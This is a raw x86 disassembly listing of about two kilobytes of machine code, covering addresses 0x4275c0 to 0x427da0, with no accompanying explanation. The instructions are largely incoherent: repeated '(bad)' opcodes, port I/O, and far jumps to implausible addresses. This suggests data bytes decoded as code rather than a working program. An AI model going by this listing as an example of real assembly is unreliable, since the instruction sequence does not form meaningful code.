  4275c0:	xchg   DWORD PTR ds:0x6e912d1c,edx
  4275c6:	popa   
  4275c7:	jp     0x427627
  4275c9:	repnz fst DWORD PTR [ebp+0x53bcbfdc]
  4275d0:	call   0x296157d5
  4275d5:	xor    DWORD PTR [edx+0x634a02f2],ecx
  4275db:	mov    bh,0xd2
  4275dd:	sbb    DWORD PTR [ecx+0x25d22fdf],edx
  4275e3:	ror    BYTE PTR [ebp+0x4b4ab73],0x43
  4275ea:	mov    bl,0x20
  4275ec:	clc    
  4275ed:	jl     0x427584
  4275ef:	es sbb eax,0x15191a09
  4275f5:	xor    DWORD PTR [edi+edx*1+0x11],esp
  4275f9:	mov    ebp,0xb99ea8ab
  4275fe:	mov    ebx,0xedaad94c
  427603:	loop   0x4275a5
  427605:	fmul   st(5),st
  427607:	sahf   
  427608:	inc    esp
  427609:	mov    dh,0xeb
  42760b:	push   ebx
  42760c:	adc    esi,ebx
  42760e:	int    0xc2
  427610:	lea    edi,[edi]
  427612:	xchg   ch,dl
  427614:	add    BYTE PTR [eax-0x66],0x17
  427618:	test   al,0x2d
  42761a:	les    ebx,FWORD PTR [ebx+0x31702e77]
  427620:	enter  0x7971,0x7b
  427624:	cmp    ecx,ebx
  427626:	jo     0x42760e
  427628:	mov    edx,0xe0371773
  42762d:	fs jne 0x42765a
  427630:	cmc    
  427631:	sahf   
  427632:	sbb    DWORD PTR [ecx+0x38],ebx
  427635:	retf   
  427636:	cmp    al,0x28
  427638:	push   eax
  427639:	dec    eax
  42763a:	mov    bh,0x8a
  42763c:	sbb    DWORD PTR [esi],0x3d7dda0b
  427642:	or     esp,esp
  427644:	and    ecx,ecx
  427646:	pushf  
  427647:	inc    edx
  427648:	sub    ah,bh
  42764a:	imul   ecx,esi,0x73
  42764d:	jle    0x4275e6
  42764f:	and    eax,0xa0eb9d7a
  427654:	xchg   ebx,eax
  427655:	jge    0x4276c7
  427657:	push   ebp
  427658:	xchg   esi,eax
  427659:	push   ebp
  42765a:	clc    
  42765b:	mov    ds:0xb33c927c,al
  427660:	add    BYTE PTR [ebx+0x3aa0d2d8],dl
  427666:	push   es
  427667:	test   esi,0x37061eb2
  42766d:	push   es
  42766e:	xor    al,0x8b
  427670:	sbb    eax,0xae21c322
  427675:	retf   0x8c96
  427678:	aam    0x25
  42767a:	ds dec esi
  42767c:	sub    DWORD PTR [eax+esi*2],edx
  42767f:	mov    BYTE PTR [edi+0x28],ah
  427682:	ja     0x4276ca
  427684:	pop    eax
  427685:	xchg   edx,eax
  427686:	mov    bl,BYTE PTR [ebp+0x4c]
  427689:	out    dx,al
  42768a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42768b:	xchg   ebp,eax
  42768c:	add    al,0x0
	...
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	outs   dx,BYTE PTR ds:[esi]
  4276a7:	inc    edi
  4276a8:	pop    ecx
  4276a9:	pop    esp
  4276aa:	(bad)  
  4276ab:	jmp    0x4276ae
  4276ad:	add    bl,bh
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [edx+0x39],al
  4276b4:	jecxz  0x42763c
  4276b6:	shr    DWORD PTR [ebx-0x29],0x84
  4276ba:	sub    ecx,DWORD PTR [edx]
  4276bc:	jns    0x4276a8
  4276be:	add    eax,DWORD PTR [ebp+0x22b2c7d8]
  4276c4:	cs push edi
  4276c6:	mov    ebp,0x80fb7fa2
  4276cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276cc:	sub    BYTE PTR [eax-0x61],0x2d
  4276d0:	(bad)  
  4276d1:	cmp    al,0x87
  4276d3:	xlat   BYTE PTR ds:[ebx]
  4276d4:	cdq    
  4276d5:	and    DWORD PTR [esi+edx*4-0x7bfcb4b3],ebx
  4276dc:	nop
  4276dd:	add    ecx,DWORD PTR ds:0x8873ac25
  4276e3:	dec    eax
  4276e4:	js     0x427763
  4276e6:	push   ebp
  4276e7:	push   0xffffff8b
  4276e9:	movhps QWORD PTR [ebx+ebp*1],xmm3
  4276ed:	(bad)
  4276f0:	mov    eax,0xfe51f731
  4276f5:	ja     0x42772e
  4276f7:	sub    BYTE PTR [ecx+edi*1-0x72],dh
  4276fb:	or     DWORD PTR ds:0xd35ffb22,ebx
  427701:	rcr    bl,cl
  427703:	sub    eax,0xeceb2958
  427708:	retf   
  427709:	adc    edx,DWORD PTR [ecx+0x31056ace]
  42770f:	jp     0x4276da
  427711:	dec    ecx
  427712:	mov    bh,0x1d
  427714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427715:	pop    ds
  427716:	fwait
  427717:	xor    bl,BYTE PTR [esi]
  427719:	(bad)  
  42771a:	jbe    0x427753
  42771c:	(bad)  
  42771d:	fnstsw WORD PTR ds:0xef1deabc
  427723:	xchg   BYTE PTR [ecx-0x5b],bh
  427726:	dec    ebp
  427727:	stos   DWORD PTR es:[edi],eax
  427728:	pop    es
  427729:	cmp    BYTE PTR [eax],dl
  42772b:	mov    esp,DWORD PTR [edx-0x20dcafc]
  427731:	lds    ebx,FWORD PTR [edx+0x7a]
  427734:	stos   DWORD PTR es:[edi],eax
  427735:	push   edx
  427736:	rcr    BYTE PTR [eax-0x36],cl
  427739:	pushf  
  42773a:	aam    0x5e
  42773c:	xchg   DWORD PTR [ecx+0x37db9cdb],eax
  427742:	dec    edx
  427743:	leave  
  427744:	stos   BYTE PTR es:[edi],al
  427745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427746:	jo     0x4276e7
  427748:	pushf  
  427749:	dec    esp
  42774a:	adc    DWORD PTR [edx+0x61],ecx
  42774d:	loop   0x427709
  42774f:	xor    eax,ecx
  427751:	icebp  
  427752:	adc    DWORD PTR [eax-0x1b43616d],ecx
  427758:	and    ecx,DWORD PTR [ebp+0x2431c8a4]
  42775e:	sbb    bh,BYTE PTR [ecx+edi*4-0x38]
  427762:	or     edi,eax
  427764:	sub    DWORD PTR [edx+0x4f613616],ebx
  42776a:	or     BYTE PTR [ecx-0x30],dl
  42776d:	jl     0x427790
  42776f:	leave  
  427770:	not    DWORD PTR ds:0x33bf8b28
  427776:	lock mov ah,0x9e
  427779:	fistp  DWORD PTR ds:0x42119f30
  42777f:	jmp    0x5d560483
  427784:	cdq    
  427785:	mov    ds:0xc449282a,eax
  42778a:	and    bl,dl
  42778c:	jnp    0x4277fe
  42778e:	pop    ebx
  42778f:	cdq    
  427790:	fld    TBYTE PTR [edi+0x29]
  427793:	(bad)  
  427795:	in     eax,0x2a
  427797:	test   DWORD PTR [ecx-0x77],0x72a6c492
  42779e:	mov    edi,0xd5c31a5a
  4277a3:	jb     0x427725
  4277a5:	sar    al,cl
  4277a7:	or     al,0x32
  4277a9:	push   esp
  4277aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277ab:	pop    ebp
  4277ac:	in     eax,dx
  4277ad:	dec    ebx
  4277ae:	aad    0xf0
  4277b0:	sbb    ch,bh
  4277b2:	cwde   
  4277b3:	push   0x1521118d
  4277b8:	jmp    0x266c0c0f
  4277bd:	cmp    eax,0x112fe1c0
  4277c2:	sub    DWORD PTR [ebx-0xa],ebx
  4277c5:	enter  0x4f64,0xc3
  4277c9:	push   cs
  4277ca:	not    BYTE PTR ds:0xd2c2f976
  4277d0:	data16 jbe 0x427773
  4277d3:	frstor [edi+0x72]
  4277d6:	jbe    0x4277d2
  4277d8:	mov    al,ds:0xb3fd6842
  4277dd:	mov    edx,0xc4d84849
  4277e2:	mov    al,ds:0x8ec48ce2
  4277e7:	jmp    0x9e78:0x797a761
  4277ee:	mov    al,ds:0xeaab2b91
  4277f3:	push   edi
  4277f4:	add    al,0x1e
  4277f6:	or     DWORD PTR [eax+edi*2+0x7d],0xffffffb0
  4277fb:	arpl   WORD PTR [ebx],sp
  4277fd:	xchg   dh,al
  4277ff:	jecxz  0x4277d1
  427801:	mov    ds,ebp
  427803:	sub    dh,BYTE PTR [edx-0x3d]
  427806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427807:	push   esp
  427808:	adc    al,0xfd
  42780a:	cmp    BYTE PTR [esi+0x36],0xa2
  42780e:	imul   esi,DWORD PTR [edx],0xffffff9c
  427811:	or     dh,bh
  427813:	sub    ebp,DWORD PTR [ebp-0x77]
  427816:	mov    esp,0xfc7116c5
  42781b:	mov    esi,0xa9908bf
  427820:	cld    
  427821:	sbb    eax,0x4a3a6da
  427826:	xchg   BYTE PTR [esi+0x0],ah
  427829:	(bad)  
  42782a:	jp     0x4277e2
  42782c:	into   
  42782d:	adc    BYTE PTR [edx+0x372e3243],cl
  427833:	popa   
  427834:	outs   dx,BYTE PTR ds:[esi]
  427835:	push   es
  427836:	xchg   BYTE PTR [ecx],cl
  427838:	push   esi
  427839:	xlat   BYTE PTR ds:[ebx]
  42783a:	or     BYTE PTR [ebx-0x34],bl
  42783d:	retf   0x4200
  427840:	fisttp WORD PTR [ebp+0x65]
  427843:	aaa    
  427844:	inc    edi
  427845:	daa    
  427846:	and    eax,0x2d627843
  42784b:	cmc    
  42784c:	xchg   ebx,eax
  42784d:	add    ch,BYTE PTR [edx]
  42784f:	sti    
  427850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427851:	pop    eax
  427852:	out    0x5f,eax
  427854:	push   esi
  427855:	in     al,dx
  427856:	jge    0x427859
  427858:	mov    cl,0xa2
  42785a:	lds    edi,FWORD PTR [edi+0x62207cee]
  427860:	add    DWORD PTR [ecx+0xa],0xffffffce
  427864:	or     al,0x1b
  427866:	mov    DWORD PTR [ebp+ebx*1-0x1f877bcc],eax
  42786d:	call   0xc8c4deb0
  427872:	push   ebx
  427873:	sahf   
  427874:	cmovg  eax,DWORD PTR [ebx+0x650239d9]
  42787b:	test   eax,0x4b13f26
  427880:	adc    DWORD PTR [edi-0x70ce28a2],edi
  427886:	jbe    0x4278ff
  427888:	or     al,0x4
  42788a:	into   
  42788b:	outs   dx,BYTE PTR ds:[esi]
  42788c:	mov    ebp,0xf5be73d
  427891:	cmp    BYTE PTR [ebx],dl
  427893:	or     al,0xf3
  427895:	sbb    ebp,DWORD PTR [edi+0xe4cfe2a]
  42789b:	xchg   ecx,eax
  42789c:	scas   eax,DWORD PTR es:[edi]
  42789d:	sbb    ebp,ebx
  42789f:	push   ds
  4278a0:	imul   esi,DWORD PTR [ecx*2-0x34f75b4a],0xfa86a35f
  4278ab:	fldcw  WORD PTR [edi+0x0]
	...
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	stos   BYTE PTR es:[edi],al
  4278c7:	lahf   
  4278c8:	jbe    0x427892
  4278ca:	cli    
  4278cb:	in     eax,dx
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	sti    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [ecx-0x7be3e2fb],bl
  4278d7:	mov    eax,0x40a9de02
  4278dc:	lods   al,BYTE PTR ds:[esi]
  4278dd:	or     al,0x52
  4278e0:	fstp   st(1)
  4278e2:	cmp    eax,0xf72df17
  4278e7:	jle    0x427953
  4278e9:	xchg   edx,eax
  4278ea:	xrelease xchg DWORD PTR [eax],eax
  4278ed:	les    edi,FWORD PTR [ebx]
  4278ef:	bnd jp 0x42796d
  4278f2:	ret    
  4278f3:	xchg   ebx,eax
  4278f4:	adc    cl,BYTE PTR [eax]
  4278f6:	sub    ah,cl
  4278f8:	add    BYTE PTR [eax+0x32],al
  4278fb:	sti    
  4278fc:	test   eax,0xb6d59031
  427901:	mov    ebp,0x8c9aa4b7
  427906:	leave  
  427907:	cmp    BYTE PTR [eax],0x98
  42790a:	(bad)  
  42790b:	in     eax,0xf5
  42790d:	xlat   BYTE PTR ds:[ebx]
  42790e:	out    dx,eax
  42790f:	rcr    DWORD PTR [eax-0x79843a90],0x59
  427916:	jae    0x42797b
  427918:	push   ebx
  427919:	shl    DWORD PTR [eax-0x73d30caf],1
  42791f:	sbb    DWORD PTR [esi-0x10],esi
  427922:	loopne 0x427979
  427924:	fadd   st,st(0)
  427926:	mov    edx,0x2be6ed7f
  42792b:	or     al,BYTE PTR [edi-0x80]
  42792e:	popa   
  42792f:	cdq    
  427930:	call   DWORD PTR [eax]
  427932:	iret   
  427933:	sub    BYTE PTR [ebx+0x6decd8ec],dh
  427939:	push   edi
  42793a:	sbb    cl,BYTE PTR [edx-0x5649ed72]
  427940:	push   esp
  427941:	mov    dl,0x6b
  427943:	out    0x85,eax
  427945:	jmp    0x4278d5
  427947:	in     al,dx
  427948:	add    BYTE PTR [edi],0x9c
  42794b:	(bad)  
  42794c:	outs   dx,DWORD PTR ds:[esi]
  42794d:	mov    DWORD PTR [edi+0x64],esi
  427950:	cmp    al,BYTE PTR [ebp+0x73353177]
  427956:	loopne 0x427975
  427958:	fcomp  QWORD PTR [esi+edx*4-0x6b2abe37]
  42795f:	ret    0xb0df
  427962:	cld    
  427963:	push   edi
  427964:	pop    es
  427965:	imul   DWORD PTR ds:0xd05c7825
  42796b:	and    bh,BYTE PTR ds:0xcdb9309
  427971:	pop    es
  427972:	dec    edx
  427973:	loope  0x4279f4
  427975:	sar    DWORD PTR [ecx],0xb1
  427978:	add    ecx,esi
  42797a:	out    0x4,eax
  42797c:	dec    ecx
  42797d:	xor    al,0x84
  42797f:	cmp    DWORD PTR [ebp+0x573be2d5],ebx
  427985:	mov    ah,0xae
  427987:	inc    ebp
  427988:	aam    0x68
  42798a:	add    ah,BYTE PTR [ecx]
  42798c:	stc    
  42798d:	adc    ax,0xe39e
  427991:	out    dx,al
  427992:	test   ch,dl
  427994:	and    BYTE PTR [edi+edi*1+0x11f09805],al
  42799b:	push   es
  42799c:	aaa    
  42799d:	mov    ah,0x30
  42799f:	stos   DWORD PTR es:[edi],eax
  4279a0:	aad    0x54
  4279a2:	cmp    BYTE PTR [edi+esi*8+0x6d95bd6e],al
  4279a9:	ds push eax
  4279ab:	icebp  
  4279ac:	inc    esp
  4279ad:	jg     0x42799b
  4279af:	xchg   BYTE PTR [edx-0x40],ch
  4279b2:	rcl    DWORD PTR [edx],0x69
  4279b5:	inc    edi
  4279b6:	sbb    eax,0x3f5120c9
  4279bb:	popf   
  4279bc:	in     al,0x4a
  4279be:	push   eax
  4279bf:	out    dx,al
  4279c0:	call   0xc66e779e
  4279c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279c6:	lock or ah,dl
  4279c9:	jg     0x42799a
  4279cb:	mov    dl,0xe
  4279cd:	xchg   BYTE PTR [esp+ebp*2],cl
  4279d0:	or     al,BYTE PTR [eax]
  4279d2:	dec    esi
  4279d3:	test   BYTE PTR [ebx],al
  4279d5:	jecxz  0x427a32
  4279d7:	pop    es
  4279d8:	rcr    DWORD PTR [edx-0x2fd545ac],0xfb
  4279df:	jns    0x427a11
  4279e1:	jae    0x42799c
  4279e3:	aam    0x4f
  4279e5:	xchg   esp,eax
  4279e6:	mov    ah,0x7c
  4279e8:	push   esi
  4279e9:	imul   ebx,esp,0xc2fa7bd1
  4279ef:	push   ebp
  4279f0:	xchg   BYTE PTR [ebp+0x75],dl
  4279f3:	pushf  
  4279f4:	jne    0x4279f2
  4279f6:	sar    BYTE PTR [ebp-0x80],cl
  4279f9:	leave  
  4279fa:	scas   eax,DWORD PTR es:[edi]
  4279fb:	int    0xa3
  4279fd:	and    DWORD PTR ds:0xff55b3f,ecx
  427a03:	pop    ebp
  427a04:	inc    esi
  427a05:	pop    ebp
  427a06:	mov    ebp,0x672d0836
  427a0b:	(bad)  
  427a0c:	xchg   ecx,eax
  427a0d:	xchg   DWORD PTR [ebx],esp
  427a0f:	lea    ecx,[ebx]
  427a11:	add    eax,0xd90c1676
  427a16:	inc    edi
  427a17:	int    0xb7
  427a19:	stos   BYTE PTR es:[edi],al
  427a1a:	loop   0x427a00
  427a1c:	pop    ebx
  427a1d:	jmp    0xfcf1:0xe72249b
  427a24:	(bad)  [esi]
  427a26:	outs   dx,BYTE PTR ds:[esi]
  427a27:	cs jnp 0x427a3c
  427a2a:	push   cs
  427a2b:	push   esp
  427a2c:	cmp    BYTE PTR [eax+0x2a],ah
  427a2f:	fild   QWORD PTR [edx+0x1f]
  427a32:	cmp    BYTE PTR [eax-0x4e],dh
  427a35:	outs   dx,DWORD PTR ds:[esi]
  427a36:	pushf  
  427a37:	leave  
  427a38:	sub    DWORD PTR [edx],esi
  427a3a:	inc    edi
  427a3b:	dec    edx
  427a3c:	fld    TBYTE PTR [ebp-0x1]
  427a3f:	test   eax,0xb1aff99a
  427a44:	push   ecx
  427a45:	not    eax
  427a47:	lods   al,BYTE PTR ds:[esi]
  427a48:	push   edi
  427a49:	fst    QWORD PTR [edx]
  427a4b:	sbb    BYTE PTR [ebp-0x4bd492c6],0x2f
  427a52:	loope  0x4279fb
  427a54:	ins    BYTE PTR es:[edi],dx
  427a55:	and    eax,0xcd44c5
  427a5a:	ins    BYTE PTR es:[edi],dx
  427a5b:	into   
  427a5c:	adc    ch,bh
  427a5e:	push   edx
  427a5f:	push   0x6ca976b0
  427a64:	mov    ch,0xb1
  427a66:	sub    ecx,edx
  427a68:	nop
  427a69:	adc    BYTE PTR [ebx-0x7f4767ef],al
  427a6f:	or     edx,DWORD PTR [eax+0x21]
  427a72:	outs   dx,DWORD PTR ds:[esi]
  427a73:	call   0xb598c915
  427a78:	cmc    
  427a79:	sbb    eax,0x20e147a7
  427a7e:	test   DWORD PTR [edx+0x1947ea78],esp
  427a84:	pop    edi
  427a85:	pop    edx
  427a86:	mov    cl,ch
  427a88:	push   es
  427a89:	neg    dh
  427a8b:	(bad)  
  427a8d:	jns    0x427a8a
  427a8f:	lock push ecx
  427a91:	cs and ebp,ebp
  427a94:	test   eax,0x65409cff
  427a99:	retf   
  427a9a:	fisub  WORD PTR [eax-0x644febad]
  427aa0:	fidiv  WORD PTR [eax+0x1d]
  427aa3:	push   ds
  427aa4:	ficomp WORD PTR [esi]
  427aa6:	jns    0x427a5e
  427aa8:	test   DWORD PTR [esi+0x45],ebx
  427aab:	aas    
  427aac:	pop    esp
  427aad:	out    0x70,al
  427aaf:	sbb    eax,0xea358f40
  427ab4:	mov    ebx,0x1f89813d
  427ab9:	mov    ds:0x41ccbb38,al
  427abe:	xchg   esi,eax
  427abf:	fwait
  427ac0:	cmp    al,0x7b
  427ac2:	call   0xd6da4cd
  427ac7:	into   
  427ac8:	lods   eax,DWORD PTR ds:[esi]
  427ac9:	adc    edx,eax
  427acb:	mov    ds:0x8b,eax
	...
  427ad8:	add    BYTE PTR [eax],al
  427ada:	pop    ecx
  427adb:	add    eax,ecx
  427add:	inc    esp
  427ade:	fcmovnb st,st(6)
  427ae0:	fstp   QWORD PTR [edi]
  427ae2:	arpl   WORD PTR [edi+0x30154d6c],di
  427ae8:	pop    ebx
  427ae9:	pop    es
  427aea:	cmc    
  427aeb:	out    dx,eax
  427aec:	add    DWORD PTR [eax],eax
  427aee:	sti    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR [ebp-0x53],ah
  427af4:	cmp    DWORD PTR [ecx-0xc],edx
  427af7:	loop   0x427b33
  427af9:	adc    al,0xed
  427afb:	push   eax
  427afc:	inc    ebp
  427afd:	lds    esp,FWORD PTR [edx-0x1f]
  427b00:	push   ebx
  427b01:	stos   BYTE PTR es:[edi],al
  427b02:	addr16 leave 
  427b04:	inc    eax
  427b05:	call   FWORD PTR [ecx-0x28309e10]
  427b0b:	gs in  eax,dx
  427b0d:	xlat   BYTE PTR ds:[ebx]
  427b0e:	push   0x29c5546a
  427b13:	cs mov bl,0xe6
  427b16:	fcmovne st,st(7)
  427b18:	cwde   
  427b19:	jp     0x427add
  427b1b:	jns    0x427b11
  427b1d:	call   0x9316:0x372ee407
  427b24:	push   eax
  427b25:	inc    ebp
  427b26:	(bad)  
  427b27:	mov    ch,0x32
  427b29:	mov    ah,0x97
  427b2b:	outs   dx,DWORD PTR ds:[esi]
  427b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b2d:	xchg   ecx,eax
  427b2e:	stc    
  427b2f:	scas   al,BYTE PTR es:[edi]
  427b30:	inc    edx
  427b31:	mov    ds:0x3f56a0e,eax
  427b36:	sbb    edx,DWORD PTR [ecx]
  427b38:	push   edx
  427b39:	bound  ebp,QWORD PTR [eax-0x2d]
  427b3c:	call   0x26a7:0xf696ead
  427b43:	sbb    DWORD PTR [edx],edx
  427b45:	adc    DWORD PTR [ecx],eax
  427b47:	sub    eax,0x7c572a95
  427b4c:	push   es
  427b4d:	and    al,0x4a
  427b4f:	fwait
  427b50:	daa    
  427b51:	or     BYTE PTR [ecx],cl
  427b53:	sbb    BYTE PTR [ecx-0x6ed1eebf],bh
  427b59:	mov    ebp,0x7abe1a1b
  427b5e:	in     al,0xde
  427b60:	pusha  
  427b61:	xor    edx,DWORD PTR [eax]
  427b63:	mov    bh,0xc
  427b65:	cld    
  427b66:	sub    BYTE PTR [edi+0x44855ee3],0xfa
  427b6d:	dec    edi
  427b6e:	out    0x41,eax
  427b70:	int    0x51
  427b72:	popf   
  427b73:	btc    DWORD PTR [ecx+0x55],ebx
  427b77:	in     eax,dx
  427b78:	sub    BYTE PTR [edi],bh
  427b7a:	mov    edi,0x85deb5e1
  427b7f:	in     al,0xb9
  427b81:	sti    
  427b82:	mov    DWORD PTR [ecx],esi
  427b84:	in     al,0xc1
  427b86:	mov    ebp,0xf9ec154c
  427b8b:	shr    bl,0xfa
  427b8e:	fld    DWORD PTR [ecx]
  427b90:	sub    ebp,DWORD PTR [ecx]
  427b92:	rep outs dx,DWORD PTR ds:[esi]
  427b94:	add    BYTE PTR [ebp+0x4a],bl
  427b97:	push   ebx
  427b98:	dec    esi
  427b99:	cmp    ebp,0x37bd602f
  427b9f:	nop
  427ba0:	and    BYTE PTR [ebx],dl
  427ba2:	out    0x44,eax
  427ba4:	ins    DWORD PTR es:[edi],dx
  427ba5:	sub    esp,DWORD PTR [edx-0x640786b4]
  427bab:	lock and esp,edi
  427bae:	add    DWORD PTR [ecx+0x5f],ecx
  427bb1:	or     al,0x24
  427bb3:	mov    esi,0xe34d409e
  427bb8:	cdq    
  427bb9:	mov    dl,0x7d
  427bbb:	adc    esp,DWORD PTR [esi+0x36]
  427bbe:	xor    al,0xa2
  427bc0:	jns    0x427be1
  427bc2:	enter  0x7000,0x15
  427bc6:	cmp    al,0xa7
  427bc8:	imul   esp,DWORD PTR [esp+ebp*2],0xffffffe0
  427bcc:	pop    edi
  427bcd:	add    ah,dh
  427bcf:	mov    ah,0xf0
  427bd1:	pop    ss
  427bd2:	repnz dec eax
  427bd4:	and    al,0x7
  427bd6:	adc    BYTE PTR [esi+ecx*2+0x27],dh
  427bda:	xchg   ebp,eax
  427bdb:	out    dx,al
  427bdc:	xchg   edi,eax
  427bdd:	nop
  427bde:	sbb    bh,BYTE PTR [ebp+0x40]
  427be1:	lock pop ebp
  427be3:	jmp    0x427bc1
  427be5:	ss arpl dx,di
  427be8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  427bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427beb:	jp     0x427b6d
  427bed:	adc    DWORD PTR [eax-0x61],esi
  427bf0:	dec    ebx
  427bf1:	addr16 mov edx,0xf1e4313a
  427bf7:	dec    eax
  427bf8:	scas   al,BYTE PTR es:[edi]
  427bf9:	xor    eax,0x8f9843ff
  427bfe:	mov    ecx,0xe25832ba
  427c03:	sbb    al,0x70
  427c05:	and    al,0xb3
  427c07:	inc    ecx
  427c08:	mov    eax,0xcdf733f3
  427c0d:	or     ch,BYTE PTR [esi+ebp*8]
  427c10:	mov    DWORD PTR [ebx],eax
  427c12:	mov    al,ds:0x1bbaa596
  427c17:	js     0x427c3f
  427c19:	add    BYTE PTR ds:0x49a550b8,bl
  427c1f:	in     eax,0xb1
  427c21:	mov    ebx,0xbdbf8217
  427c26:	imul   edx,DWORD PTR [edi-0xd],0xbe130e2c
  427c2d:	add    ecx,DWORD PTR [esi+0x1bfb70a7]
  427c33:	mov    ebp,0xeadfe9df
  427c38:	or     edi,ecx
  427c3a:	or     al,0x3e
  427c3c:	adc    bl,bh
  427c3e:	jae    0x427c9b
  427c40:	or     ecx,DWORD PTR [esi+0x20]
  427c43:	cdq    
  427c44:	icebp  
  427c45:	jb     0x427c7e
  427c47:	out    0x64,al
  427c49:	ror    BYTE PTR [edx+0x5c],cl
  427c4c:	inc    esi
  427c4d:	movaps XMMWORD PTR [esi+eax*8+0xd87d9bd],xmm0
  427c55:	push   edx
  427c56:	push   ds
  427c57:	adc    esi,DWORD PTR [eax+0x1a]
  427c5a:	dec    ebp
  427c5b:	sub    BYTE PTR [esi],cl
  427c5d:	dec    ebx
  427c5e:	dec    ecx
  427c5f:	adc    bl,0xd4
  427c62:	add    BYTE PTR ds:0xc519dfd5,bl
  427c68:	ds ds mov bl,0x4d
  427c6c:	sub    al,0x56
  427c6e:	call   0xe7018494
  427c73:	jne    0x427cd1
  427c75:	(bad)  
  427c76:	and    bh,BYTE PTR [edi]
  427c78:	cmp    edi,ebx
  427c7a:	(bad)  
  427c7b:	test   BYTE PTR [eax+0x1],bl
  427c7e:	cmc    
  427c7f:	mov    ds:0x20560daa,al
  427c84:	scas   eax,DWORD PTR es:[edi]
  427c85:	scas   eax,DWORD PTR es:[edi]
  427c86:	shl    BYTE PTR [ecx+ecx*4-0x440750fc],1
  427c8d:	mov    eax,0x74c9a526
  427c92:	push   eax
  427c93:	enter  0x14aa,0xf3
  427c97:	mov    eax,0x494077a6
  427c9c:	sub    DWORD PTR [ebx],esi
  427c9e:	(bad)  [ebx+eiz*4+0x1fbd6f84]
  427ca5:	mov    ch,0x64
  427ca7:	icebp  
  427ca8:	xor    BYTE PTR [esi],0xf1
  427cab:	fdivr  st(4),st
  427cad:	cmp    bh,BYTE PTR [ecx-0x29]
  427cb0:	pop    ecx
  427cb1:	and    edi,ecx
  427cb3:	push   0x2359db5e
  427cb8:	mov    WORD PTR [edi],gs
  427cba:	call   DWORD PTR [ebp-0x65]
  427cbd:	xor    edx,edi
  427cbf:	sub    dh,dh
  427cc1:	adc    al,BYTE PTR [edx-0x41c93b8d]
  427cc7:	add    al,0xd6
  427cc9:	out    dx,eax
  427cca:	cwde   
  427ccb:	mov    ds:0x7a935d16,al
  427cd0:	dec    esi
  427cd1:	fwait
  427cd2:	jp     0x427cd1
  427cd4:	aad    0x26
  427cd6:	mov    eax,ds:0x59bc558
  427cdb:	jecxz  0x427d08
  427cdd:	outs   dx,DWORD PTR ds:[esi]
  427cde:	aad    0x1f
  427ce0:	or     al,0x8a
  427ce2:	dec    esi
  427ce3:	cwde   
  427ce4:	xchg   ebp,eax
  427ce5:	cli    
  427ce6:	or     BYTE PTR [ecx-0x8],bh
  427ce9:	push   esi
  427cea:	xor    bl,cl
  427cec:	fld    DWORD PTR [eax]
	...
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	fmul   DWORD PTR [ebp-0x20]
  427d09:	dec    eax
  427d0a:	lock icebp 
  427d0c:	add    DWORD PTR [eax],eax
  427d0e:	sti    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [ebp-0x47],bl
  427d14:	cmc    
  427d15:	fld    st(6)
  427d17:	pop    esp
  427d18:	jmp    0x3ce4:0x27c617e2
  427d1f:	loopne 0x427cb2
  427d21:	dec    edx
  427d22:	fstp   DWORD PTR [eax-0x3a]
  427d25:	gs dec eax
  427d27:	retf   0xde94
  427d2a:	out    0x88,al
  427d2c:	mov    DWORD PTR [edx],esp
  427d2e:	call   0xa50a2da4
  427d33:	fldcw  WORD PTR [edi+0x9f01ad7]
  427d39:	xchg   edi,eax
  427d3a:	popf   
  427d3b:	cmp    DWORD PTR [edi+0x3],ebx
  427d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d3f:	or     dl,al
  427d41:	push   ds
  427d42:	fidivr DWORD PTR [eax+0x75]
  427d45:	icebp  
  427d46:	mov    ebp,0x9b93838c
  427d4b:	out    0x3,al
  427d4d:	sbb    BYTE PTR [ebx+0x28],ah
  427d50:	int    0x26
  427d52:	add    BYTE PTR [ecx-0x74],dl
  427d55:	add    eax,0x8566efe3
  427d5a:	xchg   BYTE PTR [ecx-0x7389aa6c],ah
  427d60:	int3   
  427d61:	mov    edx,0xd1a916d4
  427d66:	repz int 0x6b
  427d69:	std    
  427d6a:	pop    esp
  427d6b:	and    DWORD PTR [ebx-0x4f],ebp
  427d6e:	jl     0x427cf7
  427d70:	mov    ah,0x2a
  427d72:	xchg   esp,eax
  427d73:	mov    ecx,DWORD PTR [esp+ecx*8]
  427d76:	dec    DWORD PTR [ebx+0x77e99081]
  427d7c:	mov    edx,0xbca54304
  427d81:	mov    esi,0xa39156d3
  427d86:	outs   dx,BYTE PTR ds:[esi]
  427d87:	rcr    DWORD PTR fs:[ebx],1
  427d8a:	add    DWORD PTR [eax],ebp
  427d8c:	mov    bh,0x75
  427d8e:	pop    ds
  427d8f:	mov    ds:0xdfa9ce2a,eax
  427d94:	sub    BYTE PTR [ecx+0x642a261],0x77
  427d9b:	arpl   WORD PTR [ecx],bx
  427d9d:	scas   al,BYTE PTR es:[edi]
  427d9e:	mov    WORD PTR [ebx],?
  427da0:	xchg   esp,eax
